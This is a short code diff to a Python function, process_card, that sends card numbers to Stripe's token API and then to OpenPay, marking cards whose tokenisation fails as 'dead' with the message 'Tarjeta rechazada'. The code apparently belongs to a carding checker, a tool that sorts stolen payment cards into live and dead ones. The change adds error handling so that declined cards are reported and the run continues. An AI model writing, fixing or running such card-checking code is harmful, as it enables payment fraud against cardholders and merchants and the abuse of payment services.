@@ -300,8 +300,13 @@ async def process_card(card: str) -> str:
 
             response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
             responsePm = json.loads(response.text)
-            tokenst = responsePm['id']
-            print(tokenst)
+            if "id" in responsePm:
+                tokenst = responsePm["id"]
+                print(tokenst)
+            else:
+                mensaje = f"Tarjeta rechazada:"
+                status = "dead"
+                return {"status": status, "message": mensaje, "cc": card}
 
             headers = {
                 'authority': 'api.openpay.mx',
@@ -424,4 +429,5 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
